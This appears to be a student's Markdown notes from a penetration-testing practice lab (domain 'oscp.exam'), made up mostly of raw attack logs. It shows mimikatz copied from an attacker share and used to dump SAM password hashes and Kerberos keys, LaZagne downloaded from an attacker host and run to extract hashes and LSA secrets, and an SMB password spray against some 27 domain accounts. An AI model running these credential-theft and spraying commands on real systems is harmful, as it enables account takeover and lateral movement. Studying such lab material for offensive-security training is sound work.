# Mimikatz

```powershell
PS C:\Users\Administrator> net use \\192.168.49.104\share /user:username pw
The command completed successfully.

PS C:\Users\Administrator> cp \\192.168.49.104\share\mimikatz.exe .
PS C:\Users\Administrator> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # log logonpasswords.txt
Using 'logonpasswords.txt' for logfile : OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

700     {0;000003e7} 1 D 43270          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00e24f5d} 3 D 16065372    WS26\Administrator      S-1-5-21-2756297892-2186407355-380279769-500    (14g,25p)       Primary
 * Thread Token  : {0;000003e7} 1 D 16177523    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # lsadump::sam
Domain : WS26
SysKey : 6efca182500dc518f4c19cf5341a30d4
Local SID : S-1-5-21-2756297892-2186407355-380279769

SAMKey : 24426470f121aa90530be4b3c19d878b

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 6d2907763f2fdae4099a65bdb012045c
    lm  - 0: 407b7adefdd553a2de47fb9811116f29
    ntlm- 0: 6d2907763f2fdae4099a65bdb012045c
    ntlm- 1: 6d2907763f2fdae4099a65bdb012045c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e7d88aabdeda8a50b6c8bd4ea585dd44

* Primary:Kerberos-Newer-Keys *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e9f31a70b7ddcdd063ba3f337a9d58bf2103f34602f47b51a57465253ab811bd
      aes128_hmac       (4096) : d936e790bfe354dc5357fbca7f15b778
      des_cbc_md5       (4096) : 9b98987002327fce
    OldCredentials
      aes256_hmac       (4096) : 18e95cb5dfb458db5c3202bdd5045ed141a70a2af39860d1042113ab3fa3f9ad
      aes128_hmac       (4096) : 45290fc8d9c01413cef0a27ccc91f347
      des_cbc_md5       (4096) : 5d8525c8d6ab9d52
    OlderCredentials
      aes256_hmac       (4096) : 53c7cdd42d708d6ec10e1c7814c62167bad6454ea6dc42d9e5c1bb8ab7b9d79d
      aes128_hmac       (4096) : ea7898e7e9d3e319005056b9e5f7dd43
      des_cbc_md5       (4096) : 91ce9dab57548f0b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WS26.OSCP.EXAMAdministrator
    Credentials
      des_cbc_md5       : 9b98987002327fce
    OldCredentials
      des_cbc_md5       : 5d8525c8d6ab9d52


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5403e400be738dd915e176be5da78216

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : aedf7c3484786b0b08c3cf5390100e59

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fde783dddc7dba274cdb578e91c742114e263fda3f85d2de370b2094d1de0bc0
      aes128_hmac       (4096) : ded4018116eea7e5616be59ae6ffe2e2
      des_cbc_md5       (4096) : eca497e5c275648c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : eca497e5c275648c
      
mimikatz # sekurlsa::tickets /export
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

---

# Lazagne -> nothing

- [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)
```powershell
iwr -uri http://192.168.49.104:8888/LaZagne.exe -OutFile .\LaZagne.exe
.\LaZagne.exe all -oN -output lazagne.out
```

```powershell

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for ab60b95f-cb94-4504-a93b-31d9b15405e3
[+] System masterkey decrypted for aca15899-6cbe-4714-8149-c735649cf731
[+] System masterkey decrypted for b4823bcd-ed47-4b7d-8d22-cda7c58bad55

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:6d2907763f2fdae4099a65bdb012045c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5403e400be738dd915e176be5da78216:::

------------------- Lsa_secrets passwords -----------------

$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   CB AC F8 C8 0C D5 A1 04 73 BE D9 5C FA 43 1C 43    ........s....C.C
0020   A0 86 2E B8 7D D0 15 97 06 9D FD CE 0D 88 42 41    ....}.........BA
0030   5F DD BC 34 57 B0 E2 C6 07 C8 CA 93 B6 5D E6 B8    _..4W........]..
0040   23 6A FD 5F 67 00 C0 6B B1 AC 86 ED D4 53 6D 78    #j._g..k.....Smx
0050   7F E3 45 93 FD 1A 63 95 1A 1B 1A 0D 06 B7 9E 9C    ..E...c.........
0060   6C 66 10 DD 34 8A 59 20 79 C6 E4 9D 7D 0E AD 5E    lf..4.Y y...}..^
0070   D3 9A 71 61 6D 59 C4 DD 07 50 B2 42 D4 58 18 4F    ..qamY...P.B.X.O
0080   8C 53 15 6E D0 9A 14 DE 8B 0E E8 D1 0B 61 CD 78    .S.n.........a.x
0090   CE 05 FD FD 8E 51 51 7C FD 1D 1A 3A 88 FE 6A F3    .....QQ|...:..j.
00A0   A9 93 54 5A AE 95 8F A4 B7 E0 12 B0 4D DF 71 B6    ..TZ........M.q.
00B0   37 DD 52 C6 FA 2E 89 3F D2 05 1D BA 41 CD 2C 12    7.R....?....A.,.
00C0   AB 21 66 EB 62 1D B0 F6 46 31 00 06 71 4E 1B C8    .!f.b...F1..qN..
00D0   0E 85 BE 18 69 FC 6F 15 FE B4 D2 78 13 E1 2F 8C    ....i.o....x../.
00E0   D9 B7 11 7B 9E 3C 8F DA EB 2D 23 88 50 E8 F5 1B    ...{.<...-#.P...
00F0   F0 9E C6 3A E5 97 F9 45 82 A2 2B 5A 2F C7 FF A2    ...:...E..+Z/...
0100   4F 2D 3F EE 59 25 94 29 F1 D7 99 92 A8 C5 F6 4A    O-?.Y%.).......J

CachedDefaultPassword
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   4E C9 82 47 42 D3 7C 2A B0 FD E9 30 24 28 87 2C    N..GB.|*...0$(.,

DPAPI_SYSTEM
0000   01 00 00 00 34 38 73 E8 DB 25 7C 13 C9 32 03 90    ....48s..%|..2..
0010   93 FC 49 CE 7C 89 AD 77 83 20 CD 21 11 09 B1 4D    ..I.|..w. .!...M
0020   AA 17 9B E5 24 0B 2C 0B 3C B3 39 48                ....$.,.<.9H

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   00 2E 3D B8 6E 4F F2 1C 39 FC 87 12 9E A4 8C 18    ..=.nO..9.......
0020   21 16 B4 8F 59 92 96 84 96 DF CA 3B 8E 57 91 F9    !...Y......;.W..
0030   B6 1D 02 94 47 79 49 BB 12 98 64 78 B8 85 CA 31    ....GyI...dx...1
0040   B2 5C 56 1F 20 72 C8 26 38 80 05 F6 1E 39 E2 DE    ..V. r.&8....9..
0050   9A 20 53 4C 16 BF 5B 11 65 28 6C D7 56 61 A3 A2    . SL..[.e(l.Va..


[+] File written: .\credentials_22022026_014650.txt

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 5.043184995651245
PS C:\Users\Administrator>
```

---

# Admin Password spray -> 失敗

```sh
┌──(koshi㉿kali)-[~/Exam/AD/AD_Common]
└─$ nxc smb $TargetIP -u usernames.txt -p CarHammerChip964 --continue-on-success
SMB         172.16.104.202  445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.ROGERS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\ADMINISTRATOR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\U.GREGORY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\C.DEAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\O.HUGHES@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\P.GETHIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\T.FUCHS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.WILLIAMS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.SKINNER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\G.JARVIS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\M.NEWMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\J.KOLE@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.TUCKER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\L.EVGENY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.ANDREWS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\R.GALLAGHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\S.FISCHER@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\K.FREEMAN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.CROSS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\E.DDWARDS@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\D.HALL@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\F.HATFIELD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\B.MARTIN@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\V.PERRY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\A.BAILEY@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\W.BYRD@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 
SMB         172.16.104.202  445    SRV22            [-] oscp.exam\IUSR@OSCP.EXAM:CarHammerChip964 STATUS_LOGON_FAILURE 

```

---

# 列挙

- 
